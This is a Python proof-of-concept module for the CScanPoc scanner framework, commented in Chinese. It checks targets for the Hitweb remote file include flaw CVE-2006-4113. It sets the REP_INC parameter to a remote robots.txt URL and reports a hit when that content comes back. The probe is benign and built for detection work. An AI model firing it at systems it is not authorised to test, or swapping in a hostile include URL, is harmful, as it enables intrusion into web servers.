# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Hitweb_0000'  # 平台漏洞编号
    # 漏洞名称
    name = 'Hitweb <= 4.2.1 (REP_INC) Remote File Include Vulnerability'
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RFI  # 漏洞类型
    disclosure_date = '2006-08-08'  # 漏洞公布时间
    desc = '''
        HITWEB是一个基于PHP、PHPLib和MySQL的站点程序，可提供各种分类的Internet站点集合。 
        Hitweb <= 4.2.1 (REP_INC)版本存在远程文件包含漏洞 。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2006-6159'
    cnvd_id = 'CNVD-2006-6159'  # cnvd漏洞编号
    cve_id = 'CVE-2006-4113'  # cve编号
    product = 'Hitweb'  # 漏洞组件名称
    product_version = '<= 4.2.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c9b78c66-15a3-4030-9308-b4b0133fe265'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/genpage-cgi.php?REP_INC=http://baidu.com/robots.txt'
            response = requests.get(vul_url).text
            if 'Baiduspider' in response or 'Googlebot' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
